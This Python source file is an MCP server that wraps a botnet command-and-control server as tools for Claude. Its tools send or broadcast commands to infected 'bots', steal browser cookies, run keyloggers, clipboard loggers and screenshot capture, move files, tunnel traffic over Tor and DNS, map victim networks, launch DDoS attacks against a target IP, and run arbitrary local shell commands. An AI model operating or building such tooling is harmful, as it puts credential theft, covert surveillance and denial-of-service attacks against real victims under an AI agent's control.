#!/usr/bin/env python3
"""
MCP Server for C2 Server Management
Allows Claude AI to manage the C2 server via MCP protocol
"""

import asyncio
import socket
import json
import os
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent

# Server.py ile iletişim için helper
class ServerConnection:
    def __init__(self, host='10.207.254.191', port=5001):
        self.host = host
        self.port = port
    
    async def send_command(self, command: str) -> str:
        """Send command to Server.py and get response"""
        try:
            reader, writer = await asyncio.open_connection(self.host, self.port)
            
            # Send command
            writer.write(json.dumps({'command': command}).encode() + b'\n')
            await writer.drain()
            
            # Read response
            data = await reader.read(4096)
            response = json.loads(data.decode())
            
            writer.close()
            await writer.wait_closed()
            
            return response.get('result', 'No response received')
        except Exception as e:
            return f"Connection error: {str(e)}"

# MCP Server
app = Server("c2-server")
server_conn = ServerConnection()

@app.list_tools()
async def list_tools() -> list[Tool]:
    """Define tools Claude can use - FULL C2 CONTROL"""
    return [
        # Bot Management
        Tool(
            name="list_bots",
            description="List all connected bots with IP, status, P2P status and security alerts",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="get_bot_info",
            description="Get detailed information about a specific bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID (e.g., 'bot-1')"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="stop_bot",
            description="Stop/kill a specific bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID to stop"}},
                "required": ["bot_id"]
            }
        ),
        # Server Status
        Tool(
            name="get_server_status",
            description="Get C2 server information - host, port, encryption, active bots",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="get_security_status",
            description="Show security rules status and active alerts",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="get_p2p_status",
            description="Show P2P network status for all bots",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="get_alerts",
            description="Show all security alerts (Wireshark and security alerts)",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # Tor Management
        Tool(
            name="tor_enable",
            description="Start Tor service for anonymous connections",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="tor_disable",
            description="Stop Tor service",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="tor_renew",
            description="Renew Tor identity (get new IP)",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="tor_status",
            description="Show Tor service status and connected Tor bots",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="list_tor_bots",
            description="List bots connected via Tor",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="list_clearnet_bots",
            description="List bots connected via clearnet (no Tor)",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # Web Dashboard
        Tool(
            name="web_start",
            description="Start web dashboard for browser-based management",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="web_stop",
            description="Stop web dashboard",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="web_status",
            description="Show web dashboard status",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # Show Commands
        Tool(
            name="show_exploits",
            description="Show comprehensive exploit database (CVEs for Windows, Linux, macOS)",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_stats",
            description="Show system statistics",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_logs",
            description="Show system logs",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_config",
            description="Show server configuration",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_history",
            description="Show command history",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_files",
            description="Show file system information",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="show_network",
            description="Show network information",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # Bot Commands
        Tool(
            name="send_bot_command",
            description="Send any command to a specific bot and get response (cmd <bot_id> <command>)",
            inputSchema={
                "type": "object",
                "properties": {
                    "bot_id": {"type": "string", "description": "Bot ID"},
                    "command": {"type": "string", "description": "Command to send (whoami, pwd, ls, screenshot, system_info, etc.)"}
                },
                "required": ["bot_id", "command"]
            }
        ),
        Tool(
            name="broadcast_command",
            description="Send command to ALL connected bots",
            inputSchema={
                "type": "object",
                "properties": {"command": {"type": "string", "description": "Command to broadcast"}},
                "required": ["command"]
            }
        ),
        Tool(
            name="get_processes",
            description="Get running processes from a bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="upload_file",
            description="Upload file to bot",
            inputSchema={
                "type": "object",
                "properties": {
                    "bot_id": {"type": "string", "description": "Bot ID"},
                    "file_path": {"type": "string", "description": "Local file path to upload"}
                },
                "required": ["bot_id", "file_path"]
            }
        ),
        Tool(
            name="download_file",
            description="Download file from bot",
            inputSchema={
                "type": "object",
                "properties": {
                    "bot_id": {"type": "string", "description": "Bot ID"},
                    "remote_path": {"type": "string", "description": "Remote file path on bot"}
                },
                "required": ["bot_id", "remote_path"]
            }
        ),
        Tool(
            name="get_cookies",
            description="Steal browser cookies from bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="start_keylogger",
            description="Start keylogger on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="stop_keylogger",
            description="Stop keylogger on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="start_clipboard",
            description="Start clipboard logger on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="stop_clipboard",
            description="Stop clipboard logger on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="start_screenshot",
            description="Start screenshot capture on bot (saves to ScreenS/ folder)",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="stop_screenshot",
            description="Stop screenshot capture on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        # DNS Tunnel
        Tool(
            name="dns_tunnel_enable",
            description="Enable DNS tunneling with domain",
            inputSchema={
                "type": "object",
                "properties": {"domain": {"type": "string", "description": "Domain for DNS tunnel (e.g., c2domain.com)"}},
                "required": ["domain"]
            }
        ),
        Tool(
            name="dns_tunnel_disable",
            description="Disable DNS tunneling",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="dns_tunnel_status",
            description="Show DNS tunneling status",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # Network Mapping
        Tool(
            name="network_map_start",
            description="Start network mapping on bot",
            inputSchema={
                "type": "object",
                "properties": {
                    "bot_id": {"type": "string", "description": "Bot ID"},
                    "scope": {"type": "string", "description": "Network scope (e.g., 192.168.1.0/24)"}
                },
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="network_map_stop",
            description="Stop network mapping on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="network_map_status",
            description="Check network mapping status on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        Tool(
            name="list_network_maps",
            description="Show all network maps",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        # DDoS (Educational)
        Tool(
            name="ddos_start",
            description="Start DDoS attack on target (EDUCATIONAL ONLY)",
            inputSchema={
                "type": "object",
                "properties": {
                    "bot_id": {"type": "string", "description": "Bot ID to use"},
                    "target_ip": {"type": "string", "description": "Target IP address"},
                    "duration": {"type": "integer", "description": "Attack duration in seconds (max 300)", "default": 30},
                    "threads": {"type": "integer", "description": "Number of threads (max 100)", "default": 50}
                },
                "required": ["bot_id", "target_ip"]
            }
        ),
        Tool(
            name="ddos_stop",
            description="Stop DDoS attack on bot",
            inputSchema={
                "type": "object",
                "properties": {"bot_id": {"type": "string", "description": "Bot ID"}},
                "required": ["bot_id"]
            }
        ),
        # Terminal
        Tool(
            name="execute_terminal",
            description="Execute terminal command on local computer",
            inputSchema={
                "type": "object",
                "properties": {"command": {"type": "string", "description": "Terminal command"}},
                "required": ["command"]
            }
        ),
        # Server Control
        Tool(
            name="clear_screen",
            description="Clear console screen",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
        Tool(
            name="get_help",
            description="Show all available commands help",
            inputSchema={"type": "object", "properties": {}, "required": []}
        ),
    ]

@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    """Handle tool calls - FULL C2 CONTROL"""
    
    # Bot Management
    if name == "list_bots":
        result = await server_conn.send_command("list")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_bot_info":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"info {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "stop_bot":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    # Server Status
    elif name == "get_server_status":
        result = await server_conn.send_command("server")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_security_status":
        result = await server_conn.send_command("security")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_p2p_status":
        result = await server_conn.send_command("p2p status")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_alerts":
        result = await server_conn.send_command("alerts")
        return [TextContent(type="text", text=result)]
    
    # Tor Management
    elif name == "tor_enable":
        result = await server_conn.send_command("tor enable")
        return [TextContent(type="text", text=result)]
    
    elif name == "tor_disable":
        result = await server_conn.send_command("tor disable")
        return [TextContent(type="text", text=result)]
    
    elif name == "tor_renew":
        result = await server_conn.send_command("tor renew")
        return [TextContent(type="text", text=result)]
    
    elif name == "tor_status":
        result = await server_conn.send_command("tor status")
        return [TextContent(type="text", text=result)]
    
    elif name == "list_tor_bots":
        result = await server_conn.send_command("tor bots")
        return [TextContent(type="text", text=result)]
    
    elif name == "list_clearnet_bots":
        result = await server_conn.send_command("clearnet bots")
        return [TextContent(type="text", text=result)]
    
    # Web Dashboard
    elif name == "web_start":
        result = await server_conn.send_command("web start")
        return [TextContent(type="text", text=result)]
    
    elif name == "web_stop":
        result = await server_conn.send_command("web stop")
        return [TextContent(type="text", text=result)]
    
    elif name == "web_status":
        result = await server_conn.send_command("web status")
        return [TextContent(type="text", text=result)]
    
    # Show Commands
    elif name == "show_exploits":
        result = await server_conn.send_command("show exploits")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_stats":
        result = await server_conn.send_command("show stats")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_logs":
        result = await server_conn.send_command("show logs")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_config":
        result = await server_conn.send_command("show config")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_history":
        result = await server_conn.send_command("show history")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_files":
        result = await server_conn.send_command("show files")
        return [TextContent(type="text", text=result)]
    
    elif name == "show_network":
        result = await server_conn.send_command("show network")
        return [TextContent(type="text", text=result)]
    
    # Bot Commands
    elif name == "send_bot_command":
        bot_id = arguments.get("bot_id", "")
        command = arguments.get("command", "")
        result = await server_conn.send_command(f"cmd {bot_id} {command}")
        return [TextContent(type="text", text=result)]
    
    elif name == "broadcast_command":
        command = arguments.get("command", "")
        result = await server_conn.send_command(f"broadcast {command}")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_processes":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"processes {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "upload_file":
        bot_id = arguments.get("bot_id", "")
        file_path = arguments.get("file_path", "")
        result = await server_conn.send_command(f"upload {bot_id} {file_path}")
        return [TextContent(type="text", text=result)]
    
    elif name == "download_file":
        bot_id = arguments.get("bot_id", "")
        remote_path = arguments.get("remote_path", "")
        result = await server_conn.send_command(f"download {bot_id} {remote_path}")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_cookies":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"cookies {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "start_keylogger":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"keylogger start {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "stop_keylogger":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"keylogger stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "start_clipboard":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"copy start {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "stop_clipboard":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"copy stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "start_screenshot":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"ss start {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "stop_screenshot":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"ss stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    # DNS Tunnel
    elif name == "dns_tunnel_enable":
        domain = arguments.get("domain", "")
        result = await server_conn.send_command(f"dns_tunnel enable {domain}")
        return [TextContent(type="text", text=result)]
    
    elif name == "dns_tunnel_disable":
        result = await server_conn.send_command("dns_tunnel disable")
        return [TextContent(type="text", text=result)]
    
    elif name == "dns_tunnel_status":
        result = await server_conn.send_command("dns_tunnel status")
        return [TextContent(type="text", text=result)]
    
    # Network Mapping
    elif name == "network_map_start":
        bot_id = arguments.get("bot_id", "")
        scope = arguments.get("scope", "")
        cmd = f"network_map start {bot_id} {scope}" if scope else f"network_map start {bot_id}"
        result = await server_conn.send_command(cmd)
        return [TextContent(type="text", text=result)]
    
    elif name == "network_map_stop":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"network_map stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "network_map_status":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"network_map status {bot_id}")
        return [TextContent(type="text", text=result)]
    
    elif name == "list_network_maps":
        result = await server_conn.send_command("network_maps")
        return [TextContent(type="text", text=result)]
    
    # DDoS (Educational)
    elif name == "ddos_start":
        bot_id = arguments.get("bot_id", "")
        target_ip = arguments.get("target_ip", "")
        duration = arguments.get("duration", 30)
        threads = arguments.get("threads", 50)
        result = await server_conn.send_command(f"ddos start {bot_id} {target_ip} --duration {duration} --threads {threads}")
        return [TextContent(type="text", text=result)]
    
    elif name == "ddos_stop":
        bot_id = arguments.get("bot_id", "")
        result = await server_conn.send_command(f"ddos stop {bot_id}")
        return [TextContent(type="text", text=result)]
    
    # Terminal
    elif name == "execute_terminal":
        import subprocess
        import sys
        command = arguments.get("command", "")
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            stdout = result.stdout or ""
            stderr = result.stderr or ""
            output = stdout + stderr
            
            if not output.strip():
                output = f"Command executed (return code: {result.returncode})"
            
            print(f"[*] Terminal command: {command}", file=sys.stderr)
            print(f"[*] Output: {output[:200]}...", file=sys.stderr)
            
            return [TextContent(type="text", text=output)]
        except Exception as e:
            error_msg = f"Error: {str(e)}"
            print(f"[!] Terminal error: {error_msg}", file=sys.stderr)
            return [TextContent(type="text", text=error_msg)]
    
    # Server Control
    elif name == "clear_screen":
        result = await server_conn.send_command("clear")
        return [TextContent(type="text", text=result)]
    
    elif name == "get_help":
        result = await server_conn.send_command("help")
        return [TextContent(type="text", text=result)]
    
    else:
        return [TextContent(type="text", text=f"Unknown tool: {name}")]

async def main():
    """Start MCP server"""
    import sys
    try:
        print("[*] MCP Server starting...", file=sys.stderr)
        async with stdio_server() as (read_stream, write_stream):
            print("[*] Connected to Claude Desktop", file=sys.stderr)
            await app.run(
                read_stream,
                write_stream,
                app.create_initialization_options()
            )
    except Exception as e:
        print(f"[!] MCP Server error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc(file=sys.stderr)

if __name__ == "__main__":
    asyncio.run(main())
